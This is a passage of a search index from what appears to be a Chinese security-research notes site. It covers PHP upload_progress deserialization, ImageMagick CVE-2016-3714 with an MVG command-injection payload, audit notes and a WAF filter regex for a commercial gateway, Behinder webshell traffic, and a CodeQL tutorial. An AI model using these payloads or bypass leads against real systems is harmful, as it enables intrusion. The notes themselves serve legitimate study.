INI\u9009\u9879\u5f00\u542f\u65f6\uff0c\u4f60\u5728\u4e0a\u4f20\u6587\u4ef6\u7684\u540c\u65f6POST\u4e00\u4e2a\u53c2\u6570\u503c\u4e0esession.upload_progress.name\uff08\u9ed8\u8ba4\u4e3aPHP_SESSION_UPLOAD_PROGRESS\uff09\u503c\u7684\u503c\uff0c\u4f1a\u5728session\u91cc\u7559\u4e0bsession.upload_porgress.prefix\u4e0esession.upload_progress.name\u94fe\u63a5\u7684\u503c\uff0c\u800c\u540e\u8005\u7684\u5185\u5bb9\u5c31\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u540d. \u8bd5\u9a8c\u4e00\u4e0b \u6293\u5305\u6539\u5305: \u786e\u5b9e\u6709\u6b8b\u7559,\u4e8e\u662f\u51ed\u6b64\u8fdb\u884c\u4e0a\u9762\u90a3\u6761\u7684\u64cd\u4f5c\u5f00\u59cb\u53cd\u5e8f\u5217\u5316\u653b\u51fb(\u6587\u4ef6\u5305\u542b\u4e5f\u884c)","title":"2.\u5728\u6b64\u57fa\u7840\u4e0a\u5229\u7528upload_process\u673a\u5236\u6765\u5b9e\u73b0 \u201c\u5373\u4f7f\u6ca1\u6709\u8f93\u5165\u70b9\u4e5f\u80fd\u7ee7\u7eed\u89e6\u53d1\u5e8f\u5217\u5316\u6f0f\u6d1e\""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/","text":"imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09 title: imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 \u53c2\u8003 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html \u4f55\u4e3aImageMagick \u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u56fe\u7247\u7684\u7a0b\u5e8f\u3002 RCE ImageMagick\u6709\u4e00\u4e2a\u529f\u80fd\u53eb\u505a delegate(\u59d4\u6258),\u4f5c\u7528\u662f\u8c03\u7528\u5916\u90e8\u7684lib\u5904\u7406\u6587\u4ef6\u3002 \u5728ImageMagick\u7684\u914d\u7f6e\u6587\u4ef6 /etc/ImageMagick/delegates.xml \u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684\u59d4\u6258(\u81ea\u5df1\u53bb\u770b) \u5b83\u7684\u59d4\u6258\u4e00\u822c\u662f\u957f\u8fd9\u6837\u7684,\u610f\u601d\u662f\u5728\u5904\u7406https\u56fe\u7247\u65f6\uff0c\u4f1a\u8c03\u7528command\u7684\u91cc\u7684\u6307\u4ee4.command\u91cc\u7684%m\u4ee3\u8868\u4e00\u79cd\u5360\u4f4d\u7b26\uff0c%m\u5360\u4f4d\u7b26\u4ee3\u8868\u83b7\u53d6https\u56fe\u7247\u7684url\uff08\u5f53\u7136\u5360\u4f4d\u7b26\u4e0d\u4ec5\u4ec5%m\u4e00\u79cd\uff0c\u8fd8\u6709 \u6bd4\u5982%i\u662f\u8f93\u5165\u7684\u6587\u4ef6\u540d\uff0c%l\u662f\u56fe\u7247exif label\u4fe1\u606f \u7b49\u7b49\u7b49\u7b49) <delegate decode=\"https\" command=\"&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;\"/> ImageMagick\u9ed8\u8ba4\u652f\u6301\u4e00\u79cd\u56fe\u7247\u683c\u5f0f\uff0c\u53ebmvg\uff0c\u800cmvg\u4e0esvg\u683c\u5f0f\u7c7b\u4f3c\uff0c\u5176\u4e2d\u662f\u4ee5\u6587\u672c\u5f62\u5f0f\u5199\u5165\u77e2\u91cf\u56fe\u7684\u5185\u5bb9\uff0c\u800c\u8fd9\u5176\u4e2d\u5c31\u53ef\u4ee5\u5305\u542bhttps\u5904\u7406\u8fc7\u7a0b\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2amvg\u6587\u4ef6(\u6587\u4ef6\u540d\u540e\u7f00\u4e0d\u4e00\u5b9a\u975e\u5f97.mvg\uff0cimagemagick\u662f\u6309\u7167\u6587\u4ef6\u5185\u5bb9\u6765\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u7684)\u4ea4\u7ed9imagemagick\u5904\u7406\uff0c\u5728\u5176\u5305\u542bhttps\u5904\u4f7f\u7528|\u6216&\u5206\u5272\u547d\u4ee4\uff0c\u9020\u6210rce,\u5982 push graphic-context viewbox 0 0 640 480 fill 'url(https://\"|mkdir /nmsl; \")' pop graphic-context \u4e0a\u9762\u662fmvg\u7684\u4e00\u79cd\u683c\u5f0f\uff0c\u5176\u4e2d\u5728fill\u5904\u586b\u5165https\u7684url. \u5b9e\u8df5","title":"imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/#imagemagickcve-2016-3714","text":"title: imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 \u53c2\u8003 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html","title":"imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/#imagemagick","text":"\u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u56fe\u7247\u7684\u7a0b\u5e8f\u3002","title":"\u4f55\u4e3aImageMagick"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/#rce","text":"ImageMagick\u6709\u4e00\u4e2a\u529f\u80fd\u53eb\u505a delegate(\u59d4\u6258),\u4f5c\u7528\u662f\u8c03\u7528\u5916\u90e8\u7684lib\u5904\u7406\u6587\u4ef6\u3002 \u5728ImageMagick\u7684\u914d\u7f6e\u6587\u4ef6 /etc/ImageMagick/delegates.xml \u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684\u59d4\u6258(\u81ea\u5df1\u53bb\u770b) \u5b83\u7684\u59d4\u6258\u4e00\u822c\u662f\u957f\u8fd9\u6837\u7684,\u610f\u601d\u662f\u5728\u5904\u7406https\u56fe\u7247\u65f6\uff0c\u4f1a\u8c03\u7528command\u7684\u91cc\u7684\u6307\u4ee4.command\u91cc\u7684%m\u4ee3\u8868\u4e00\u79cd\u5360\u4f4d\u7b26\uff0c%m\u5360\u4f4d\u7b26\u4ee3\u8868\u83b7\u53d6https\u56fe\u7247\u7684url\uff08\u5f53\u7136\u5360\u4f4d\u7b26\u4e0d\u4ec5\u4ec5%m\u4e00\u79cd\uff0c\u8fd8\u6709 \u6bd4\u5982%i\u662f\u8f93\u5165\u7684\u6587\u4ef6\u540d\uff0c%l\u662f\u56fe\u7247exif label\u4fe1\u606f \u7b49\u7b49\u7b49\u7b49) <delegate decode=\"https\" command=\"&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;\"/> ImageMagick\u9ed8\u8ba4\u652f\u6301\u4e00\u79cd\u56fe\u7247\u683c\u5f0f\uff0c\u53ebmvg\uff0c\u800cmvg\u4e0esvg\u683c\u5f0f\u7c7b\u4f3c\uff0c\u5176\u4e2d\u662f\u4ee5\u6587\u672c\u5f62\u5f0f\u5199\u5165\u77e2\u91cf\u56fe\u7684\u5185\u5bb9\uff0c\u800c\u8fd9\u5176\u4e2d\u5c31\u53ef\u4ee5\u5305\u542bhttps\u5904\u7406\u8fc7\u7a0b\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2amvg\u6587\u4ef6(\u6587\u4ef6\u540d\u540e\u7f00\u4e0d\u4e00\u5b9a\u975e\u5f97.mvg\uff0cimagemagick\u662f\u6309\u7167\u6587\u4ef6\u5185\u5bb9\u6765\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u7684)\u4ea4\u7ed9imagemagick\u5904\u7406\uff0c\u5728\u5176\u5305\u542bhttps\u5904\u4f7f\u7528|\u6216&\u5206\u5272\u547d\u4ee4\uff0c\u9020\u6210rce,\u5982 push graphic-context viewbox 0 0 640 480 fill 'url(https://\"|mkdir /nmsl; \")' pop graphic-context \u4e0a\u9762\u662fmvg\u7684\u4e00\u79cd\u683c\u5f0f\uff0c\u5176\u4e2d\u5728fill\u5904\u586b\u5165https\u7684url.","title":"RCE"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/#_1","text":"","title":"\u5b9e\u8df5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","text":"\u4ee3\u7801\u5ba1\u8ba1 \u5165\u95e8 \u660e\u5fa1\u7f51\u5173","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#_1","text":"\u5165\u95e8 \u660e\u5fa1\u7f51\u5173","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%85%A5%E9%97%A8/%E5%85%A5%E9%97%A8/","text":"\u5165\u95e8 https://www.yuque.com/burpheart/phpaudit/php-shen-ji-ji-chu_yong-hu-ke-kong-shu-ru-su-cha-biao","title":"\u5165\u95e8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%85%A5%E9%97%A8/%E5%85%A5%E9%97%A8/#_1","text":"https://www.yuque.com/burpheart/phpaudit/php-shen-ji-ji-chu_yong-hu-ke-kong-shu-ru-su-cha-biao","title":"\u5165\u95e8"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%98%8E%E5%BE%A1%E7%BD%91%E5%85%B3/%E6%98%8E%E5%BE%A1%E7%BD%91%E5%85%B3/","text":"\u660e\u5fa1\u7f51\u5173 g\u53c2\u6570\u8fc7\u6ee4 (\\/\\*[\\s\\S]*\\*\\/)|(\\%n\\%s)|(\\s+and\\s+)|(\\\\bonmouseover\\s*=)|(\\\\bfunction\\()|(\\\\bdocument\\.)|(:prompt\\\\b)|(\\\\bprompt\\()|(\\\\bsum\\()|(\\\\bcmd\\|\\')|(\\'\\s+[\\s\\S]*\\s+\\')|(\\'\\s+\\')|(confirm\\()|(\\\\becho\\s+)|(:alert\\\\b)|(\\\\beval\\s*\\()|(\\\\bor\\s+[\\s\\S]*=[\\s\\S]*)|(\\\\band\\s+[\\s\\S]*=[\\s\\S]*)|(\\.\\.\\/)|(\\$\\(\\.\\.\\/)|(window\\[location\\])|(window\\[\\\"location\\\"\\])|(window\\[\\'location\\'\\])|(window\\.location)|(\\.\\.\\/)|(\\s*<\\s*img\\s*)|(\\s*<\\s*iframe\\s*)|(\\\\bonerror\\s*)|(\\\\bsleep\\s*)|(\\\\balert\\(\\s*)|(\\\\bjavascript:\\s*)|(\\s*ping\\s-n\\s*)|(\\s+or\\s+)|(\\\\bexec\\s+)|(\\\\bmaster\\s+)|(\\\\btruncate\\s+)|(\\\\bdeclare\\s+)|(\\s+insert\\s+)|(\\\\bselect\\s+)|(\\\\bdelete\\s+)|(\\\\bcount\\s*\\()|(\\s+chr\\s*\\()|(\\s+mid\\s*\\()|(\\s+chr\\s*\\()|(\\s+chr\\s*\\() fopen public function downloadFile($filename, $filepath, $url) \ud83c\udf39w ?url=captureobj/name/filename get if (!$this->filename_check_suffix($url_params[2], 'pcap') || !$this->filename_check($url_params[2])) { \u7b49\u5f85\u7ed5\u8fc7 eval function communicationDataSMS($conf){ \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 function sysSortArray($ArrayData, $KeyName1, $SortOrder1 = \"SORT_ASC\", $SortType1 = \"SORT_REGULAR\") \u6d89\u53ca\u5230sql\u64cd\u4f5c\uff0c\u8fd8\u6ca1\u770b\u61c2 file_get_contents $ret = file_get_contents($gwUrl.$param_data['post_data']); \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 $soapParam = file_get_contents(\"/mnt/proxy_dir/attachements/sms/\".$conf[srcfilename]); \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 move_uploaded_file ?url=auth_user_grp/import AAAGroupObj->getparam move_uploaded_file \u7591\u4f3c\u670900\u622a\u65ad \u6ca1\u670900\u622a\u65ad\uff0c\u7248\u672c\u8fc7\u9ad8 readfile export_File($_param['cert_file_name']); file_access_control\u4e86\uff0c\u7ed5\u4e0d\u8fc7 file_put_contents file_put_contents($param['index'] . 'index.htm', $html_content); xss index.htm\u4e0d\u662f\u9ed8\u8ba4\u5b58\u5728\u7684\u7684","title":"\u660e\u5fa1\u7f51\u5173"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%98%8E%E5%BE%A1%E7%BD%91%E5%85%B3/%E6%98%8E%E5%BE%A1%E7%BD%91%E5%85%B3/#_1","text":"g\u53c2\u6570\u8fc7\u6ee4 (\\/\\*[\\s\\S]*\\*\\/)|(\\%n\\%s)|(\\s+and\\s+)|(\\\\bonmouseover\\s*=)|(\\\\bfunction\\()|(\\\\bdocument\\.)|(:prompt\\\\b)|(\\\\bprompt\\()|(\\\\bsum\\()|(\\\\bcmd\\|\\')|(\\'\\s+[\\s\\S]*\\s+\\')|(\\'\\s+\\')|(confirm\\()|(\\\\becho\\s+)|(:alert\\\\b)|(\\\\beval\\s*\\()|(\\\\bor\\s+[\\s\\S]*=[\\s\\S]*)|(\\\\band\\s+[\\s\\S]*=[\\s\\S]*)|(\\.\\.\\/)|(\\$\\(\\.\\.\\/)|(window\\[location\\])|(window\\[\\\"location\\\"\\])|(window\\[\\'location\\'\\])|(window\\.location)|(\\.\\.\\/)|(\\s*<\\s*img\\s*)|(\\s*<\\s*iframe\\s*)|(\\\\bonerror\\s*)|(\\\\bsleep\\s*)|(\\\\balert\\(\\s*)|(\\\\bjavascript:\\s*)|(\\s*ping\\s-n\\s*)|(\\s+or\\s+)|(\\\\bexec\\s+)|(\\\\bmaster\\s+)|(\\\\btruncate\\s+)|(\\\\bdeclare\\s+)|(\\s+insert\\s+)|(\\\\bselect\\s+)|(\\\\bdelete\\s+)|(\\\\bcount\\s*\\()|(\\s+chr\\s*\\()|(\\s+mid\\s*\\()|(\\s+chr\\s*\\()|(\\s+chr\\s*\\() fopen public function downloadFile($filename, $filepath, $url) \ud83c\udf39w ?url=captureobj/name/filename get if (!$this->filename_check_suffix($url_params[2], 'pcap') || !$this->filename_check($url_params[2])) { \u7b49\u5f85\u7ed5\u8fc7 eval function communicationDataSMS($conf){ \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 function sysSortArray($ArrayData, $KeyName1, $SortOrder1 = \"SORT_ASC\", $SortType1 = \"SORT_REGULAR\") \u6d89\u53ca\u5230sql\u64cd\u4f5c\uff0c\u8fd8\u6ca1\u770b\u61c2 file_get_contents $ret = file_get_contents($gwUrl.$param_data['post_data']); \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 $soapParam = file_get_contents(\"/mnt/proxy_dir/attachements/sms/\".$conf[srcfilename]); \u65e0\u6cd5\u52a8\u8c03\uff0c\u5148\u4e0d\u6025 move_uploaded_file ?url=auth_user_grp/import AAAGroupObj->getparam move_uploaded_file \u7591\u4f3c\u670900\u622a\u65ad \u6ca1\u670900\u622a\u65ad\uff0c\u7248\u672c\u8fc7\u9ad8 readfile export_File($_param['cert_file_name']); file_access_control\u4e86\uff0c\u7ed5\u4e0d\u8fc7 file_put_contents file_put_contents($param['index'] . 'index.htm', $html_content); xss index.htm\u4e0d\u662f\u9ed8\u8ba4\u5b58\u5728\u7684\u7684","title":"\u660e\u5fa1\u7f51\u5173"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/","text":"\u9b54\u6539\u51b0\u874e \u6d4b\u8bd5\u7248\u672c\uff1a[Behinder_v3.0_Beta_6 ]( https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_6 \u6d41\u91cf\u5206\u6790 \u9996\u5148\u6211\u4eec\u770b\u5411\u6728\u9a6c\u6587\u4ef6\uff0c\u5206\u6790\u4e00\u6ce2\u3002 \u9996\u5148\u4f1a\u521b\u5efa\u4e00\u4e2asession\uff0c\u7136\u540e\u8bfb\u53d6\u4ece\u670d\u52a1\u7aef\u4f20\u6765\u7684\u5185\u5bb9\u3002 \u7136\u540e\u4f1a\u5224\u65ad\u662f\u5426\u52a0\u8f7dopenssl\u6a21\u5757\uff0c\u5e76\u89e3\u5bc6\u670d\u52a1\u7aef\u4f20\u6765\u7684\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u89e3\u5bc6\u5185\u5bb9\u5206\u6bb5\uff0c\u6267\u884c\u3002 \u8fd9\u4e2a\u7248\u672c\u7684\u51b0\u874e\u662f\u4e0a\u6765\u5c31\u52a0\u5bc6\u901a\u4fe1\u7684\u3002 \u5bf9\u5c31\u662f\u8fd9\u6837\u3002 \u4e0b\u9762\u6211\u4eec\u8d70wireshark\u5eb7\u5eb7","title":"\u9b54\u6539\u51b0\u874e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/#_1","text":"\u6d4b\u8bd5\u7248\u672c\uff1a[Behinder_v3.0_Beta_6 ]( https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_6","title":"\u9b54\u6539\u51b0\u874e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/%E9%AD%94%E6%94%B9%E5%86%B0%E8%9D%8E/#_2","text":"\u9996\u5148\u6211\u4eec\u770b\u5411\u6728\u9a6c\u6587\u4ef6\uff0c\u5206\u6790\u4e00\u6ce2\u3002 \u9996\u5148\u4f1a\u521b\u5efa\u4e00\u4e2asession\uff0c\u7136\u540e\u8bfb\u53d6\u4ece\u670d\u52a1\u7aef\u4f20\u6765\u7684\u5185\u5bb9\u3002 \u7136\u540e\u4f1a\u5224\u65ad\u662f\u5426\u52a0\u8f7dopenssl\u6a21\u5757\uff0c\u5e76\u89e3\u5bc6\u670d\u52a1\u7aef\u4f20\u6765\u7684\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u89e3\u5bc6\u5185\u5bb9\u5206\u6bb5\uff0c\u6267\u884c\u3002 \u8fd9\u4e2a\u7248\u672c\u7684\u51b0\u874e\u662f\u4e0a\u6765\u5c31\u52a0\u5bc6\u901a\u4fe1\u7684\u3002 \u5bf9\u5c31\u662f\u8fd9\u6837\u3002 \u4e0b\u9762\u6211\u4eec\u8d70wireshark\u5eb7\u5eb7","title":"\u6d41\u91cf\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/","text":"\u81ea\u52a8\u5316\u5ba1\u8ba1 AST\u62bd\u8c61\u8bed\u6cd5\u6811 Codeql \u5165\u95e8\u5b66\u4e60","title":"\u81ea\u52a8\u5316\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/#_1","text":"AST\u62bd\u8c61\u8bed\u6cd5\u6811 Codeql \u5165\u95e8\u5b66\u4e60","title":"\u81ea\u52a8\u5316\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/AST%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/AST%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/","text":"AST\u62bd\u8c61\u8bed\u6cd5\u6811","title":"AST\u62bd\u8c61\u8bed\u6cd5\u6811"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/AST%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/AST%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/#ast","text":"","title":"AST\u62bd\u8c61\u8bed\u6cd5\u6811"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/","text":"Codeql \u5165\u95e8\u5b66\u4e60 \u76ee\u5f55 \u4f55\u4e3aCodeql\uff1f source\uff0csink\uff0csanitizer \u4e09\u5143\u7ec4 SDK \u73af\u5883\u642d\u5efa\u4e0e\u542f\u52a8 \u57fa\u672c\u8bed\u6cd5\u3001\u6982\u5ff5 \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 metadata import statements classes and predicates from where select \u67e5\u8be2 \u6570\u636e\u6d41\u5206\u6790 Path queries \u5f15\u5165\u6a21\u5757 \u6307\u5b9asource\u3001sink \u9009\u62e9\u8282\u70b9 Codeql-java java\u5e93 \u5143\u7d20Element [Type\uff08\u7c7b\u578b\uff09 ](#Type\u7c7b\u578b) - Generics\uff08\u6cdb\u578b\uff09 - Variables\uff08\u53d8\u91cf\uff09 - \u62bd\u8c61\u8bed\u6cd5\u6811 ast - \u5143\u6570\u636e metadata - \u6307\u6807Metrics - \u8c03\u7528\u5173\u7cfbCall Gragh - java\u6570\u636e\u6d41\u5206\u6790 - \u5c40\u90e8\u6570\u636e\u6d41Local data flow - \u4f7f\u7528\u5c40\u90e8\u6570\u636e\u6d41 - \u5c40\u90e8\u6c61\u70b9\u8ffd\u8e2alocal taint tracking - \u5168\u5c40\u6570\u636e\u6d41Global data flow - \u5168\u5c40\u6c61\u70b9\u8ffd\u8e2aglobal taint tracking - \u6570\u636e\u6e90 - java\u4e2d\u7684Type - Codeql \u5b9e\u64cd - codeql lab java - 1.1 :Sources - 1.2 :sink - 1.3: TaintTracking configuration - 1.4: Partial Flow to the rescue - 1.5: Adding additional taint steps - 1.6&1.7: Adding additional taint steps\\&Adding taint steps through a constructor - 1.8\uff1aFinish line for our first issue - 3: Errors and Exceptions - ofcms\u5ba1\u8ba1\u8bd5\u6c34 - \u6587\u4ef6\u7c7b - \u6a21\u677f\u6e32\u67d3\u7c7b - jfinal_cms \u5ba1\u8ba1 - \u521d\u6b21\u5c1d\u8bd5 - XSS - \u4eceXSS\u5230RCE \u4f55\u4e3aCodeql\uff1f \u7b80\u800c\u8a00\u4e4b\uff0cCodeql\u662fgithub\u53d1\u5e03\u7684\u7528\u6765\u5206\u6790\u4ee3\u7801\u7684\u4e00\u4e2a\u95ed\u6e90\u5de5\u5177\uff0c\u5b83\u901a\u8fc7\u5c06\u4ee3\u7801\u8f6c\u6362\u4e3a\u7279\u5b9a\u7684\u6570\u636e\u5e93\u5f62\u5f0f\u8fdb\u884c\u5206\u6790\uff0c\u5e76\u4e14\u7528ql\u8bed\u8a00\u5bf9\u5176\u8fdb\u884c\u67e5\u8be2\u64cd\u4f5c\u3002 \u6bd4\u5982\u4e0b\u9762\u7684\u51e0\u6392\u4ee3\u7801\u5c31\u662f\u67e5\u8be2\u4ee3\u7801\u4e2d\u6240\u6709\u65b9\u6cd5 import java from Method method select method \u4e0b\u56fe\u4fbf\u662f\u4e0a\u9762\u4ee3\u7801\u67e5\u8be2\u5f97\u5230\u7684\u7ed3\u679c codeql\u5f88\u5f3a\u5927\uff0c\u5b83\u652f\u6301\u5982\u4e0b\u8bed\u8a00\u7684\u4ee3\u7801\u5206\u6790 source\uff0csink\uff0csanitizer \u4e09\u5143\u7ec4 source\uff0csink\uff0csanitizer \u8fd9\u4e09\u4e2a\u6982\u5ff5\u662f\u4ee3\u7801\u81ea\u52a8\u5316\u5ba1\u8ba1\u4e2d\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u6982\u5ff5\u3002codeql\u67e5\u627e\u5b89\u5168\u6f0f\u6d1e\u7684\u539f\u7406\u4fbf\u662f\u901a\u8fc7\u8fd9\u4e09\u4e2a\u4e1c\u897f\u5c55\u5f00\u7684\u3002 source\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u7684\u5f00\u59cb\u70b9\uff0c\u6bd4\u5982\u83b7\u53d6http\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\uff0c\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684source\uff0c\u5982\u4e0b\u56fe\u3002 sink\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u7684\u7ed3\u675f\u70b9\uff0c\u5f80\u5f80\u662f\u4e00\u4e9b\u5371\u9669\u51fd\u6570\u88ab\u53ef\u63a7\u53c2\u6570\u6240\u89e6\u53d1\uff0c\u5982\u53ef\u63a7\u53c2\u6570\u88ab\u4f20\u5165\u6267\u884csql\u8bed\u53e5\uff0c\u4f20\u5165\u4e86eval\u65b9\u6cd5\u7b49\uff0c\u5982\u4e0b\u56fe\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684sink\uff08sql\u6ce8\u5165\uff09 sanitizer \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6761\u6f0f\u6d1e\u94fe\u4e2d\u7684\u8fc7\u6ee4\u51fd\u6570\uff0c\u7528\u4e8e\u963b\u65ad\u6f0f\u6d1e\u94fe\u4ecesource\u6210\u529f\u8d70\u5230sink \u5982\u679csource\u548csink\u540c\u65f6\u5b58\u5728\uff0c\u5e76\u4e14source\u5230sink\u662f\u901a\u7684\uff0c\u5c31\u8bf4\u660e\u6f0f\u6d1e\u5b58\u5728\u3002 SDK codeql\u662f\u7528\u6765\u5206\u6790\u4ee3\u7801\u7684\u5de5\u5177\uff0c\u5176\u672c\u4f53\u53ea\u662f\u4e00\u4e2a\u89e3\u6790\u5f15\u64ce\uff0c\u9700\u8981\u4e3a\u5176\u63d0\u4f9b\u4e00\u7cfb\u5217\u8bed\u6cd5\u89c4\u5219\u6765\u8fdb\u884c\u5206\u6790\u3002 